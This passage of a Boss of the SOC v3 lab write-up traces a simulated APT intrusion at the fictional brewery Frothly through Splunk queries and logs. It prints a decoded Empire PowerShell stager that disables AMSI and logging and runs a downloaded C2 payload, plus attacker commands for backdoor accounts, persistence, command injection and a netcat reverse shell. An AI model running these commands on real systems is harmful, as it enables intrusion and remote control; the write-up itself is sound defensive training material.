		<Opcode>0</Opcode>
		<Keywords>0x8000000000000000</Keywords>
		<TimeCreated SystemTime='2018-08-20T09:55:52.450060800Z'/>
		<EventRecordID>36035</EventRecordID>
		<Correlation/>
		<Execution ProcessID='3516' ThreadID='5172'/>
		<Channel>Microsoft-Windows-Sysmon/Operational</Channel>
		<Computer>BGIST-L.froth.ly</Computer>
		<Security UserID='S-1-5-18'/>
	</System>
	<EventData>
		<Data Name='UtcTime'>2018-08-20 09:55:52.449</Data>
		<Data Name='ProcessGuid'>{EBF7A186-B00B-5B58-0000-0010CC954200}</Data>
		<Data Name='ProcessId'>10096</Data>
		<Data Name='Image'>C:\Program Files\WindowsApps\microsoft.windowscommunicationsapps_16005.10228.20127.0_x64__8wekyb3d8bbwe\HxTsr.exe</Data>
		<Data Name='TargetFilename'>C:\Users\BruceGist\AppData\Local\Packages\microsoft.windowscommunicationsapps_8wekyb3d8bbwe\LocalState\Files\S0\3\Frothly-Brewery-Financial-Planning-FY2019-Draft[66].xlsm</Data>
		<Data Name='CreationUtcTime'>2018-08-20 09:55:52.449</Data>
	</EventData>
</Event>
```

Just 2 seconds later, Symantec automatically quarantined the file.

**Indexed Time**: 8/20/18 4:55:54 PM

**System Time**: 2018-08-20T09:55:54.785Z
```xml
<Event
	xmlns='http://schemas.microsoft.com/win/2004/08/events/event'>
	<System>
		<Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385F-C22A-43E0-BF4C-06F5698FFBD9}'/>
		<EventID>11</EventID>
		<Version>2</Version>
		<Level>4</Level>
		<Task>11</Task>
		<Opcode>0</Opcode>
		<Keywords>0x8000000000000000</Keywords>
		<TimeCreated SystemTime='2018-08-20T09:55:54.785936300Z'/>
		<EventRecordID>36036</EventRecordID>
		<Correlation/>
		<Execution ProcessID='3516' ThreadID='5172'/>
		<Channel>Microsoft-Windows-Sysmon/Operational</Channel>
		<Computer>BGIST-L.froth.ly</Computer>
		<Security UserID='S-1-5-18'/>
	</System>
	<EventData>
		<Data Name='UtcTime'>2018-08-20 09:55:54.785</Data>
		<Data Name='ProcessGuid'>{EBF7A186-AB12-5B58-0000-0010EB030000}</Data>
		<Data Name='ProcessId'>4</Data>
		<Data Name='Image'>System</Data>
		<Data Name='TargetFilename'>C:\ProgramData\Symantec\Symantec Endpoint Protection\14.2.760.0000.105\SRTSP\Quarantine\AP4D3C539B.xlsm</Data>
		<Data Name='CreationUtcTime'>2018-08-20 09:55:54.785</Data>
	</EventData>
</Event>
```

And about a minute later, we saw a detection alert in the Windows Application logs identifying the malware as `W97M.Empstage`.

```shell
08/19/2018 21:56:39 PM
LogName=Application
SourceName=Symantec AntiVirus
EventCode=51
EventType=2
Type=Error
ComputerName=BGIST-L.froth.ly
TaskCategory=The operation completed successfully.
OpCode=None
RecordNumber=7375
Keywords=Classic
Message= 

Security Risk Found! W97M.Empstage in File: C:\Users\BruceGist\AppData\Local\Packages\microsoft.windowscommunicationsapps_8wekyb3d8bbwe\LocalState\Files\S0\3\Frothly-Brewery-Financial-Planning-FY2019-Draft[66].xlsm by: Auto-Protect scan.  Action: Cleaned by Deletion.  Action Description: The file was deleted successfully.
```
With that identifier, I attempted to search for its discovery date via public Symantec malware databases. Unfortunately, since the BOTS challenge was created in 2018, many of the original threat intel pages have since been removed or deprecated, so I was unable to confirm a verified date from Symantec’s current site.

Still, this investigation yielded a wealth of context. First, we linked the Excel macro file to Bruce Gist’s compromised endpoint (`BGIST-L`), and we noticed the file triggered Outlook's `HxTsr.exe`. That pointed to an email attack.

So, I pivoted to message trace logs within a narrow window

```sql
index=botsv3 sourcetype=ms:o365:reporting:messagetrace 
AND earliest="8/20/2018:16:55:00" latest="8/20/2018:16:55:52"
|table _time FromIP SenderAddress Subject
```
![pic51](assets/images/botsv3/pic51.png)

This confirmed that a phishing email was sent around that time, originating from the compromised `BGIST-L` machine. The sender was `bgist@froth.ly`, and the subject was: **“Draft Financial Plan for Brewery FY2019.”**

To see recipients and attachments, i moved on to smtp logs

```sql
index=botsv3 sourcetype=stream:smtp AND "Draft Financial Plan for Brewery FY2019"
AND earliest="8/20/2018:16:55:00" latest="8/20/2018:16:55:52"
|table sender receiver_email{} subject attach_filename{}
```

| sender                      | receiver_email{}                                                                   | subject                                 | attach_filename{}      |
| --------------------------- | ---------------------------------------------------------------------------------- | --------------------------------------- | ---------------------- |
| Bruce Gist <bgist@froth.ly> | bstoll@froth.ly <br> fyodor@froth.ly <br> ghoppy@froth.ly <br> abungstein@froth.ly | Draft Financial Plan for Brewery FY2019 | Malware Alert Text.txt |

What’s interesting is that the intended payload seems to have been blocked or replaced with a text file. Decoding the base64 content in `Malware Alert Text.txt`, we get:

```shell
     Content-Type: application/octet-stream; name="Malware Alert Text.txt"
Content-Description: Malware Alert Text.txt
Content-Disposition: attachment; filename="Malware Alert Text.txt"; size=197;
	creation-date="Mon, 15 Sep 2018 01:21:13 GMT";
	modification-date="Mon, 15 Sep 2018 01:21:13 GMT"
Content-Transfer-Encoding: base64


     TWFsd2FyZSB3YXMgZGV0ZWN0ZWQgaW4gb25lIG9yIG1vcmUgYXR0YWNobWVudHMgaW5jbHVkZWQg
d2l0aCB0aGlzIGVtYWlsIG1lc3NhZ2UuIA0KQWN0aW9uOiBBbGwgYXR0YWNobWVudHMgaGF2ZSBi
ZWVuIHJlbW92ZWQuDQpGcm90aGx5LUJyZXdlcnktRmluYW5jaWFsLVBsYW5uaW5nLUZZMjAxOS1E
cmFmdC54bHNtCSBXOTdNLkVtcHN0YWdlDQo=

Base64-Decoded:
Malware was detected in one or more attachments included with this email message. 
Action: All attachments have been removed.
Frothly-Brewery-Financial-Planning-FY2019-Draft.xlsm	 W97M.Empstage
```

This confirms the delivery of a malicious `.xlsm` file containing the `W97M.Empstage` malware.

I tried checking the malware signature online, but as mentioned, Symantec’s site no longer hosts the discovery date. This was a limitation due to the age of the dataset. However, the process reveals a phishing campaign delivered via Outlook, involving a macro-enabled Excel file that was quickly detected and blocked by endpoint protection.

#### **Further Investigation and Correlation**

One question that still remains unanswered is: **How and when did Bruce Gist initially get compromised?**

In a real-world production logging system, running wide searches across all sourcetypes for a specific IP would not be ideal, as it can impact performance. But since this is a lab environment with a relatively small dataset, I decided to run a broad query using the **North Korean IP address** we previously identified.

```sql
index=botsv3 sourcetype=* AND 104.207.83.63
|reverse
```

The earliest event tied to this IP was timestamped:
- **System Time**: 2018-08-20T09:51:09
- **Indexed Time**: 8/20/18 4:51:09 PM

The event came from the `ms:o365:management` sourcetype, showing a successful login to **Bruce Gist’s Microsoft 365 account**.

```json
{
  "Version": 1,
  "ObjectId": "00000002-0000-0000-c000-000000000000",
  "Target": [
    {
      "Type": 0,
      "ID": "00000002-0000-0000-c000-000000000000"
    }
  ],
  "OrganizationId": "225e05a1-5914-4688-a404-7030e60f3143",
  "TargetContextId": "225e05a1-5914-4688-a404-7030e60f3143",
  "Workload": "AzureActiveDirectory",
  "ActorContextId": "225e05a1-5914-4688-a404-7030e60f3143",
  "RecordType": 15,
  "UserId": "bgist@froth.ly",
  "CreationTime": "2018-08-20T09:51:09",
  "Id": "cea2531d-27ab-4fa8-8e88-32887d5131ba",
  "ExtendedProperties": [
    {
      "Value": "Mozilla/5.0 (X11; U; Linux i686; ko-KP; rv: 19.1br) Gecko/20130508 Fedora/1.9.1-2.5.rs3.0 NaenaraBrowser/3.5b4",
      "Name": "UserAgent"
    },
    {
      "Value": "Login",
      "Name": "FlowTokenScenario"
    },
    {
      "Value": "1",
      "Name": "UserAuthenticationMethod"
    },
    {
      "Value": "Login:login",
      "Name": "RequestType"
    },
    {
      "Value": "Success",
      "Name": "ResultStatusDetail"
    }
  ],
  "UserKey": "10033FFFA361A98C@froth.ly",
  "UserType": 0,
  "Actor": [
    {
      "Type": 0,
      "ID": "d85d399c-9cb6-480f-8789-88cbf56e3764"
    },
    {
      "Type": 5,
      "ID": "bgist@froth.ly"
    },
    {
      "Type": 3,
      "ID": "10033FFFA361A98C"
    }
  ],
  "ClientIP": "104.207.83.63",
  "ResultStatus": "Succeeded",
  "InterSystemsId": "72983ccf-4960-451e-962a-195b95b2a2b8",
  "ActorIpAddress": "104.207.83.63",
  "IntraSystemId": "0cf13345-f991-473b-adc3-0ef107ca3800",
  "ApplicationId": "00000006-0000-0ff1-ce00-000000000000",
  "AzureActiveDirectoryEventType": 1,
  "Operation": "UserLoggedIn"
}
```

This shows that the adversary successfully authenticated to **Bruce’s account** using an uncommon user agent string: **NaenaraBrowser**, known to be associated with **North Korea's own OS systems**.

While this confirms the entry point of the attacker and the start of Bruce’s account compromise, the **root cause** of how the attacker obtained his credentials remains unknown. No brute-force attempts, phishing indicators, or drive-by download activity appear in the logs prior to this login.

So although we’ve identified the exact moment the threat actor entered Frothly’s environment, the method of credential theft (e.g. phishing, infostealer, reused credentials) is still unclear based on the available dataset.

Still, this login event serves as the initial compromise timestamp and forms a key pivot point for understanding the entire incident chain that followed.

By correlated events from previous questions, i crafted a simple timeline to help me get a high-level overview of the occuring incident.

![pic52](assets/images/botsv3/pic52.svg)

#### Question 29 (303): What is the password for the user that was successfully created by the user "root" on the on-premises Linux system?

After establishing the timeline, rather than aimlessly digging through logs for an exact answer to the question about the user created by "root" on the on-premises Linux system, I chose to track the threat actor's activities in sequence following the initial file uploads to Bruce Gist’s SharePoint.

To begin with, I filtered for activity tied to the North Korean IP (`104.207.83.63`) and its unique user-agent signature (`Naenara`) right after the SharePoint file upload timestamp:

```sql
index=botsv3 sourcetype=ms:* AND (104.207.83.63 OR *Naenara*) AND earliest="08/20/2018:16:57:33"
|reverse
```

A total of 53 events were returned from Microsoft Azure and Office 365 sources, suggesting post-delivery activities including login events, administrative operations, and email sending, a clear indication of another phishing wave.

**soucetype**

| Values                           | Count |
| -------------------------------- | ----- |
| `ms:o365:management`             | 26    |
| `ms:aad:signin`                  | 16    |
| `ms:o365:reporting:messagetrace` | 11    |


Zooming into the mail logs using message trace data:

```sql
index=botsv3 sourcetype=ms:o365:reporting:messagetrace AND (104.207.83.63 OR *Naenara*) AND earliest="08/20/2018:16:57:33"
|reverse
|table _time FromIP SenderAddress RecipientAddress Subject
```

![pic53](assets/images/botsv3/pic53.png)

These logs confirmed that the attacker sent out a batch of phishing emails impersonating Bruce, attempting to lure Frothly employees with a subject: **“Wild Birthday Extravaganza!!!”**

To investigate the email body, I queried SMTP content:

```sql
index=botsv3 sourcetype=stream:smtp AND "Wild Birthday Extravaganza!!!"
|reverse 
```

The email invited recipients to view "pictures from a birthday party," linking to a hosted `.lnk` file on the SharePoint:

```text
Check out the pictures from my 28th birthday and beer bash last night.  Goo=
d times were had by all!

https://frothly-my.sharepoint.com/:u:/g/personal/bgist_froth_ly/EZkC=
oQpVhn5PspOWXMaZ9IoBAeA-tbZnvYCboJfcH1cEBg?e=3DCMDX2m=
```

Checking for evidence of this `.lnk` file being executed across endpoints:

```sql
index=botsv3 sourcetype=xmlwineventlog "BRUCE BIRTHDAY HAPPY HOUR PICS.lnk"
|reverse 
|table host EventCode TargetFilename
|sort - host
```

| host      | EventCode | TargetFilename                                                                                                                                                 |
| --------- | --------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| PCERF-L   | 11        | C:\Users\PeatCerf\AppData\Local\Packages\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\TempState\Downloads\BRUCE BIRTHDAY HAPPY HOUR PICS.lnk.skvafh7.partial          |
| PCERF-L   | 11        | C:\Users\PeatCerf\Downloads\BRUCE BIRTHDAY HAPPY HOUR PICS.lnk.yq6fawq.partial                                                                                 |
| MKRAEUS-L | 11        | C:\Users\MalloryKraeusen\AppData\Local\Packages\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\TempState\Downloads\BRUCE BIRTHDAY HAPPY HOUR PICS.lnk.ylo9t7m.partial   |
| JWORTOS-L | 11        | C:\Users\JeremiahWortoski\AppData\Local\Packages\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\TempState\Downloads\BRUCE BIRTHDAY HAPPY HOUR PICS.lnk.0gkq09g.partial  |
| FYODOR-L  | 11        | C:\Users\FyodorMalteskesko\AppData\Local\Packages\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\TempState\Downloads\BRUCE BIRTHDAY HAPPY HOUR PICS.lnk.gapi8f2.partial |
| BTUN-L    | 11        | C:\Users\BillyTun\AppData\Local\Packages\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\TempState\Downloads\BRUCE BIRTHDAY HAPPY HOUR PICS.lnk.95m2mg1.partial          |
| BSTOLL-L  | 11        | C:\Users\BudStoll\AppData\Local\Packages\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\TempState\Downloads\BRUCE BIRTHDAY HAPPY HOUR PICS.lnk.3yekbvr.partial          |
| BSTOLL-L  | 11        | C:\Users\BudStoll\AppData\Local\Packages\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\TempState\Downloads\BRUCE BIRTHDAY HAPPY HOUR PICS.lnk.3tgpnzb.partial          |
| BGIST-L   | 11        | C:\Users\BruceGist\AppData\Local\Packages\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\TempState\Downloads\BRUCE BIRTHDAY HAPPY HOUR PICS.lnk.cjsmkqj.partial         |
| ABUNGST-L | 11        | C:\Users\AlBungstein\AppData\Local\Packages\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\TempState\Downloads\BRUCE BIRTHDAY HAPPY HOUR PICS.lnk.0w0hj03.partial       |

The results showed that multiple users had downloaded or interacted with the `.lnk` file.

```sql
index=botsv3 sourcetype=wineventlog "BRUCE BIRTHDAY HAPPY HOUR PICS.lnk"
|reverse 
|table host SourceName Message
|sort - host
```

![pic54](assets/images/botsv3/pic54.png)

Also the Windows Application logs told us the supicious file had been deleted on some enpoints. Among those, `ABUNGST-L` and `FYODOR-L` stood out as they didn’t show any subsequent deletion or AV quarantine of the file.

So, I isolated these two potentially infected systems and examined 30-minute windows of command execution using EventCode 1 from Sysmon logs:

```sql
index=botsv3 sourcetype=xmlwineventlog AND EventCode=1
AND (host=ABUNGST-L OR host=FYODOR-L)
AND earliest="08/20/2018:16:58:40" AND latest="08/20/2018:17:28:00"
|reverse
|table _time host CommandLine ParentCommandLine Image ParentImage
```

![pic55](assets/images/botsv3/pic55.png)
_Suprisingly, those 2 hosts really ran suspicous powershell commands_

Decoded the base64 Powershell command, i observed the same behaviors came from previous Boss of the SOC version 2, it resembled a variant of **Empire C2 from the Taedonggang APT** group

```powershell
# Check if PowerShell version is 3 or higher (to ensure required features exist)
If ($PSVErSIonTablE.PSVeRSIon.MAJOR  -ge 3)  {

    # Disable Script Block Logging by accessing internal .NET fields
    $GPF = [rEf].ASSemBlY.GETTyPE('System.Management.Automation.Utils')."GeTFIE`Ld"(
        'cachedGroupPolicySettings', 'NonPublic,Static'
    );

    IF ($GPF)  {
        # Get cached group policy settings
        $GPC = $GPF.GEtVALuE($null);

        # If ScriptBlockLogging is present, disable both settings
        If ($GPC['ScriptBlockLogging'])  {
            $GPC['ScriptBlockLogging']['EnableScriptBlockLogging'] = 0;
            $GPC['ScriptBlockLogging']['EnableScriptBlockInvocationLogging'] = 0;
        }

        # Prepare a fake group policy dictionary to suppress future logging
        $val = [Collections.Generic.Dictionary[String, System.Object]]::New();
        $val.Add('EnableScriptBlockLogging', 0);
        $val.Add('EnableScriptBlockInvocationLogging', 0);

        # Apply the modified settings to the registry override
        $GPC['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging'] = $val;
    } Else {
        # If GPC is unavailable, disable script signature logging as a fallback
        [ScriptBlock]."GetField"('signatures', 'NonPublic,Static').SetValue(
            $null, (New-Object Collections.Generic.HashSet[String])
        );
    }

    # Disable AMSI (Antimalware Scan Interface) by setting internal flag to true
    $ReF = [REF].ASSEMBLY.GetType('System.Management.Automation.AmsiUtils');
    $ReF.GetField('amsiInitFailed', 'NonPublic,Static').SetValue($null, $true);
};

# Avoid HTTP overhead and prevent detection heuristics
[System.Net.ServicePointManager]::Expect100Continue = 0;

# Create a WebClient for downloading payload
$wC = New-Object System.Net.WebClient;

# Set a user-agent to mimic a legitimate browser
$u = 'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';

# Disable SSL/TLS certificate validation to avoid MITM detection
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true };

# Add the user-agent twice to headers (potential evasion tactic)
$wc.Headers.Add('User-Agent', $u);
$wc.Headers.Add('User-Agent', $u); # Duplicate, may bypass some header checks

# Set proxy credentials to current user's default network credentials
$wc.Proxy = [System.Net.WebRequest]::DefaultWebProxy;
$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;
$Script:Proxy = $wc.Proxy;

# Static key used for payload decryption (RC4 key)
$K = [System.Text.Encoding]::ASCII.GetBytes('1AB<Yk6Z4#+vVu%o5}8&M-9UL~l|>0gP');

# RC4 decryption function defined as a script block
$R = {
    $D, $K = $args;
    $S = 0..255;
    0..255 | % {
        $J = ($J + $S[$_] + $K[$_%$K.Count]) % 256;
        $S[$_], $S[$J] = $S[$J], $S[$_];
    };
    $D | % {
        $I = ($I + 1) % 256;
        $H = ($H + $S[$I]) % 256;
        $S[$I], $S[$H] = $S[$H], $S[$I];
        $_ -bxor $S[($S[$I] + $S[$H]) % 256];
    }
};

# Base64-decoded C2 server address (https://45.77.53.176:443)
$ser = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String(
    'aAB0AHQAcABzADoALwAvADQANQAuADcANwAuADUAMwAuADEANwA2ADoANAA0ADMA'
)));

# Path to the malicious endpoint
$t = '/admin/get.php';

# Set a custom cookie header, possibly used for C2 session or ID
$wc.Headers.Add("Cookie", "PthAVgs=hB2H0GTIpwxCeLhGe/fLkfBpCdI=");

# Download the encrypted malicious payload
$data = $wc.DownloadData($ser + $t);

# Extract IV and ciphertext from payload
$iv = $data[0..3];
$data = $data[4..$data.Length];

# Decrypt and execute the payload in memory
-join [char[]](& $R $data ($iv + $K)) | IEX
```

Following this, I extended the timeframe to 2 hours and observed the attacker executing a full kill chain on FYODOR-L, including:

**FYODOR-L**

| @timestamp          | CommandLine                                                                                                                                                                                     | Note                                                       |
| ------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ---------------------------------------------------------- |
| 2018-08-20 17:01:41 | `"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" powershell -noP -sta -w 1 -enc  SQBmACgAJABQAFMAVgBlAFIAcwBpA...`                                                                  | First suspicious PowerShell execution appeared             |
| 2018-08-20 17:07:03 | `"C:\Windows\system32\whoami.exe" /groups`                                                                                                                                                      | Executed group enumeration                                 |
| 2018-08-20 17:08:17 | `"C:\Windows\system32\net.exe" user /add svcvnc Password123!`                                                                                                                                   | Created a new user on the host                             |
| 2018-08-20 17:08:35 | `"C:\Windows\system32\net.exe" localgroup administrators svcvnc /add`                                                                                                                           | Added user to Administrators group                         |
| 2018-08-20 17:09:44 | `"C:\Windows\system32\schtasks.exe" /Create /F /RU system /SC DAILY /ST 18:45 /TN Updater /TR "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NonI -W hidden -c...`                 | Created scheduled task for persistence                     |
| 2018-08-20 17:23:37 | `"C:\Program Files (x86)\Cisco\Cisco AnyConnect Secure Mobility Client\vpnagent.exe"`                                                                                                           | Connect to Cisco VPN                                       |
| 2018-08-20 17:40:57 | `"C:\Windows\system32\NETSTAT.EXE" -an`                                                                                                                                                         | Performed network enumeration using Netstat                |
| 2018-08-20 17:43:10 | `"C:\windows\temp\hdoor.exe" -hbs 192.168.9.1-192.168.9.50 /b /m /n`                                                                                                                            | Scanned internal network using a suspicious executable     |
| 2018-08-20 17:46:29 | `"C:\Windows\system32\netsh.exe" advfirewall set allprofiles state off`                                                                                                                         | Disabled Windows Firewall using netsh                      |
| 2018-08-20 18:05:40 | `"C:\windows\temp\unziped\lsof-master\iexeplorer.exe" http://192.168.9.30:8080/frothlyinventory/showcase.action whoami`                                                                         | Executed `whoami` on a remote server                       |
| 2018-08-20 18:06:01 | `"C:\windows\temp\unziped\lsof-master\iexeplorer.exe" http://192.168.9.30:8080/frothlyinventory/showcase.action id`                                                                             | Executed `id` on a remote server                           |
| 2018-08-20 18:06:20 | `"C:\windows\temp\unziped\lsof-master\iexeplorer.exe" http://192.168.9.30:8080/frothlyinventory/showcase.action groups`                                                                         | Executed `groups` on a remote server                       |
| 2018-08-20 18:06:38 | `"C:\windows\temp\unziped\lsof-master\iexeplorer.exe" http://192.168.9.30:8080/frothlyinventory/showcase.action "cat /etc/passwd"`                                                              | Retrieved `/etc/passwd` from remote server                 |
| 2018-08-20 18:07:03 | `"C:\windows\temp\unziped\lsof-master\iexeplorer.exe" http://192.168.9.30:8080/frothlyinventory/showcase.action "useradd -ou 0 -g 0 -M -N -r -s /bin/bash  tomcat7 -p davidverve.com"`          | Created a privileged user on the remote server             |
| 2018-08-20 18:07:27 | `"C:\windows\temp\unziped\lsof-master\iexeplorer.exe" http://192.168.9.30:8080/frothlyinventory/showcase.action "uname -a"`                                                                     | Executed `uname -a` on a remote server                     |
| 2018-08-20 18:07:46 | `"C:\windows\temp\unziped\lsof-master\iexeplorer.exe" http://192.168.9.30:8080/frothlyinventory/showcase.action "lsb_release -a"`                                                               | Executed `lsb_release -a` on a remote server               |
| 2018-08-20 18:08:36 | `"C:\windows\temp\unziped\lsof-master\iexeplorer.exe" http://192.168.9.30:8080/frothlyinventory/showcase.action "echo LyoKICogVWJ1bnR1IDE2LjA0LjQga2VybmVsIHByaXYgZXN...&gt;&gt; /tmp/colonel"` | Wrote base64-encoded payload to `/tmp/colonel`             |
| 2018-08-20 18:10:13 | `"C:\windows\temp\unziped\lsof-master\iexeplorer.exe" http://192.168.9.30:8080/frothlyinventory/showcase.action "ls -lf /tmp"`                                                                  | Listed contents of `/tmp` directory                        |
| 2018-08-20 18:10:55 | `"C:\windows\temp\unziped\lsof-master\iexeplorer.exe" http://192.168.9.30:8080/frothlyinventory/showcase.action "base64 --decode /tmp/colonel &gt; /tmp/colonel.c"`                             | Decoded base64 payload into C source file `/tmp/colonel.c` |
| 2018-08-20 18:11:27 | `"C:\windows\temp\unziped\lsof-master\iexeplorer.exe" http://192.168.9.30:8080/frothlyinventory/showcase.action "cat /tmp/colonel.c"`                                                           | Displayed contents of `/tmp/colonel.c`                     |
| 2018-08-20 18:11:45 | `"C:\windows\temp\unziped\lsof-master\iexeplorer.exe" http://192.168.9.30:8080/frothlyinventory/showcase.action "md5sum /tmp/colonel.c"`                                                        | Checked MD5 hash of the payload source file                |
| 2018-08-20 18:12:51 | `"C:\windows\temp\unziped\lsof-master\iexeplorer.exe" http://192.168.9.30:8080/frothlyinventory/showcase.action "mknod /tmp/backpipe p"`                                                        | Created named pipe (`backpipe`) as a communication channel |
| 2018-08-20 18:13:56 | `"C:\windows\temp\unziped\lsof-master\iexeplorer.exe" http://192.168.9.30:8080/frothlyinventory/showcase.action "/bin/sh 0&lt;/tmp/backpipe && nc 45.77.53.176 8088 1&gt;/tmp/backpipe"`        | Established backdoor to threat actor C2 via reverse shell  |

**ABUNGST-L**: The host showed minimal post-infection activity, indicating the attacker either didn’t pursue actions due to lack of privileges or shifted focus entirely to **FYODOR-L**, which had admin-level access. 

The attacker’s objective appeared to include both lateral movement within Frothly’s network and the compromise of critical Linux infrastructure using C2 malware and credentialed persistence.

By revealing the Threat Actor's TTPs, i think we not only found the answer of this question, but also, or might be, cleared the whole picture BOTS3 Series 300.

> ANSWER: `davidverve.com`
{: .prompt-info }

#### Question 30 (304): What is the name of the user that was created after the endpoint was compromised?

At **2018-08-20 17:08:35**, the threat actor create a user named `svcvnc` by executed `"C:\Windows\system32\net.exe" localgroup administrators svcvnc /add`.

Since we revealed all activties from Fyodor's machine, the few next questions might be just like follow-up questions.

> ANSWER: `svcvnc`
{: .prompt-info }

#### Question 31 (305): What is the process ID of the process listening on a "leet" port?

Although the question wording was initially unclear, the term “leet” likely refers to TCP port 1337 (common leetspeak). As per [SpeedGuide.net's page on port 1337](https://www.speedguide.net/port.php?port=1337), it's often used for backdoors or C2 channels.

Shifting focus, another host that hadn't been investigated yet is the Linux server accessed by the threat actor after compromising the workstation `FYODOR-L`.


```sql
index=botsv3 sourcetype=* 192.168.9.30 AND 45.77.53.176
AND earliest="08/20/2018:18:00:00"
|reverse
```
This returned 81 events, some originating from a Linux host named `hoth`. So, it’s logical to pivot and view activities from the remote server's perspective post-compromise.

```sql
|metasearch index=botsv3 host=hoth
AND earliest="08/20/2018:18:00:00"
|stats count by sourcetype
```

| **sourcetype**        | **count** |
| --------------------- | --------- |
| `syslog`              | 134304    |
| `osquery:info`        | 55167     |
| `osquery:results`     | 52563     |
| `stream:dns`          | 3706      |
| `stream:ip`           | 1310      |
| `stream:udp`          | 709       |
| `stream:http`         | 615       |
| `cpu`                 | 393       |
| `ps`                  | 393       |
| `stream:tcp`          | 369       |
| `openPorts`           | 366       |
| `Unix:Service`        | 315       |
| `bandwidth`           | 196       |
| `interfaces`          | 196       |
| `iostat`              | 196       |
| `netstat`             | 196       |
| `protocol`            | 196       |
| `top`                 | 196       |
| `vmstat`              | 195       |
| `stream:arp`          | 140       |
| `access_combined`     | 130       |
| `Unix:UserAccounts`   | 106       |
| `bash_history`        | 83        |
| `who`                 | 79        |
| `Unix:ListeningPorts` | 55        |
| `df`                  | 40        |
| `lastlog`             | 40        |
| `localhost-5`         | 30        |
| `dpkg`                | 23        |
| `lsof`                | 20        |
| `out-3`               | 17        |
| `stream:smb`          | 16        |
| `bootstrap`           | 8         |
| `alternatives`        | 4         |
| `Unix:SSHDConfig`     | 3         |
| `package`             | 3         |
| `stream:icmp`         | 3         |
| `usersWithLoginPrivs` | 3         |
| `history-2`           | 2         |

Exploring `history-2`, i observe the following installation activity:

```shell
Start-Date: 2018-08-20 11:26:16
Commandline: apt-get install netcat
Install: netcat:amd64 (1.10-41), netcat-traditional:amd64 (1.10-41, automatic)
```

The installation of `netcat` is highly relevant, as it’s often used in backdoor and port-listening activities.

To trace usage of `netcat`, we utilized `Osquery`, which provides fine-grained visibility-far more effective than just parsing syslogs.

```sql
index=botsv3 sourcetype=osquery:* 
AND earliest="08/20/2018:18:00:00" AND netcat
|reverse
|table _time columns.cmdline columns.pid decorations.username
```

![pic56](assets/images/botsv3/pic56.png)

The process is executed as the `root` user. Previously, we identified that the threat actor created a user named `tomcat7` with UID 0 (root-level). If this activity was malicious (which it clearly was), it indicates the attacker successfully escalated to `root` privileges on the remote server.

>ANSWER: `14356`
{: .prompt-info }

#### Question 32 (306): A search query originating from an external IP address of Frothly's mail server yields some interesting search terms. What is the search string?
This question ties back to the investigation in question **300**, where we examined indicators in the `SearchQuery` field. These SharePoint-hosted PDF files match known artifacts from prior incidents involving Taedonggang APT.

>"In the `ObjectId field`, we identified SharePoint-hosted, with filenames matching known artifacts from previous incidents involving Taedonggang:
>
>
>https://frothly-my.sharepoint.com/personal/ghoppy_froth_ly/Documents/Frothly-Shared/Yeasts/32065-pdf.pdf
>https://frothly-my.sharepoint.com/personal/ghoppy_froth_ly/Documents/Frothly-Shared/Yeasts/32066-pdf.pdf
>https://frothly-my.sharepoint.com/personal/ghoppy_froth_ly/Documents/Frothly-Shared/Yeasts/32136-pdf.pdf
>https://frothly-my.sharepoint.com/personal/ghoppy_froth_ly/Documents/Frothly-Shared/Yeasts/32158-pdf.pdf
>https://frothly-my.sharepoint.com/personal/ghoppy_froth_ly/Documents/Frothly-Shared/Yeasts/32497-pdf.pdf
>https://frothly-my.sharepoint.com/personal/ghoppy_froth_ly/Documents/Frothly-Shared/Yeasts/32510-pdf.pdf
>https://frothly-my.sharepoint.com/personal/ghoppy_froth_ly/Documents/Frothly-Shared/Yeasts/32624-pdf.pdf
>https://frothly-my.sharepoint.com/personal/ghoppy_froth_ly/Documents/Frothly-Shared/Yeasts/32625-pdf.pdf
>https://frothly-my.sharepoint.com/personal/ghoppy_froth_ly/Documents/Frothly-Shared/Yeasts/32634-pdf.pdf
>
>These files correlate with historical evidence where Taedonggang exfiltrated data to an FTP server.
>
>**A field name `SearchQuery`: `cromdale OR beer OR financial OR secret`, suggests targeted reconnaissance or data theft.**"
{: .prompt-tip }

This strongly suggests targeted reconnaissance, potentially searching for intellectual property or confidential data.

In context, this shows that the threat actor had already infiltrated Frothly’s Azure environment and conducted keyword-based searches, possibly for exfiltration targets.

We’ve also established earlier that the Fyodor's account (a domain admin) and Bruce (initial compromise) were used to achieve lateral movement and broader compromise.

> ANSWER: `cromdale OR beer OR financial OR secret`
{: .prompt-info }

#### Question 33 (307): What is the MD5 value of the file downloaded to Fyodor's endpoint system and used to scan Frothly's network?
This question refers back to our previous investigation into Fyodor’s endpoint, where the threat actor downloaded and executed a suspicious file named `hdoor.exe` to perform internal network scanning:

```shell
`"C:\windows\temp\hdoor.exe" -hbs 192.168.9.1-192.168.9.50 /b /m /n`
```

This strongly suggests the use of a **custom-built scanner**, likely developed by the **Taedonggang APT**. The unusual command-line flags (`-hbs`, `/b`, `/m`, `/n`) do not match any publicly known or documented network scanning tools, reinforcing the hypothesis that it’s a bespoke tool.

To extract the hash value of this executable, we can look for it in Sysmon EventCode 1 (process creation) or EventCode 15 (file creation), depending on what logs are available.

```sql
index=botsv3 sourcetype=xmlwineventlog host=FYODOR-L
AND hdoor.exe AND EventCode=1 OR EventCode=15
|reverse
|table Hashes
```

**RESULT**: `MD5=586EF56F4D8963DD546163AC31C865D7,SHA256=99925199059EE049F7AEDA8904C2F5BDFBA86671FD7A5989BD60B72F26EF737C`

